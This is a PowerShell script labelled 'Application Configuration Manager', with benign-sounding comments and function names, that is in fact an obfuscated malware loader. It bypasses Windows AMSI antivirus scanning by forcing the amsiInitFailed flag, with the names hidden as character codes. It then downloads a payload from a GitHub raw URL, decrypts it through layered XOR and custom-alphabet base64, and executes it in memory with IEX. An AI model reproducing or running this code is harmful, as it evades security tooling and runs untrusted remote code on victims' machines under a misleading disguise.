# Application Configuration Manager
# Generated: 2026-07-06 17:57:24
# Version: 3.3.95

# Initialize security context
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+[char]109+[char]115+[char]105+[char]85+[char]116+[char]105+[char]108+[char]115)).GetField($([char]97+[char]109+[char]115+[char]105+[char]73+[char]110+[char]105+[char]116+[char]70+[char]97+[char]105+[char]108+[char]101+[char]100),'NonPublic,Static').SetValue($null,$true)

# Download configuration from server
$configUrl = "https://raw.githubusercontent.com/fx510/plasma/refs/heads/main/vss.zip"
$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

try {
    $webClient = New-Object Net.WebClient
    $webClient.Encoding = [System.Text.Encoding]::UTF8
    $webClient.Headers.Add("User-Agent", $userAgent)
    $AssemblyInfo = $webClient.DownloadString($configUrl)
    $webClient.Dispose()
    
    if ([string]::IsNullOrEmpty($AssemblyInfo)) {
        exit
    }
} catch {
    exit
}

# Configuration keys
$ConfigInfo1 = "Stage1SecretKey2026Alpha"
$ConfigInfo2 = "Stage2SecretKey2026Beta"
$ConfigInfo3 = "Stage3SecretKey2026Gamma"

# Base64 configuration decoder
function Write-EnvironmentConfigBase64 {
    param([string]$Data)
    
    $standardAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    $customAlphabet = "XZHWthT7uJoSqfQVkpdULynwDeY3E52xKA8csa0Mj1mg6Nz+CblFi4rG9I/PRvBO"
    
    # Convert to character arrays for proper translation
    $dataChars = $Data.ToCharArray()
    $result = New-Object char[] $dataChars.Length
    
    for ($i = 0; $i -lt $dataChars.Length; $i++) {
        $charIndex = $customAlphabet.IndexOf($dataChars[$i])
        if ($charIndex -ge 0) {
            $result[$i] = $standardAlphabet[$charIndex]
        } else {
            $result[$i] = $dataChars[$i]
        }
    }
    
    return -join $result
}

# Data processing function
function Write-EnvironmentConfig {
    param([string]$EncodedData, [string]$ConfigKey)
    
    try {
        $AssemblyManager = [Convert]::FromBase64String($EncodedData)
        $ConfigInfoBytes = [Text.Encoding]::UTF8.GetBytes($ConfigKey)
        $LocalObjectBytes = New-Object byte[] $AssemblyManager.Length
        
        for ($index = 0; $index -lt $AssemblyManager.Length; $index++) {
            $LocalObjectBytes[$index] = $AssemblyManager[$index] -bxor $ConfigInfoBytes[$index % $ConfigInfoBytes.Length]
        }
        
        return [Text.Encoding]::UTF8.GetString($LocalObjectBytes)
    }
    catch {
        return $null
    }
}

# Process configuration
$ProcessManager = $AssemblyInfo

# Process layer 3
$ProcessManager = Write-EnvironmentConfig -EncodedData $ProcessManager -ConfigKey $ConfigInfo3

# Process layer 2
$ProcessManager = Write-EnvironmentConfigBase64 -Data $ProcessManager

# Process layer 1
$ProcessManager = Write-EnvironmentConfig -EncodedData $ProcessManager -ConfigKey $ConfigInfo1

# Load module
if ($ProcessManager) {
    # Remove BOM if present
    $ProcessManager = $ProcessManager.TrimStart([char]0xFEFF)
    IEX $ProcessManager
}
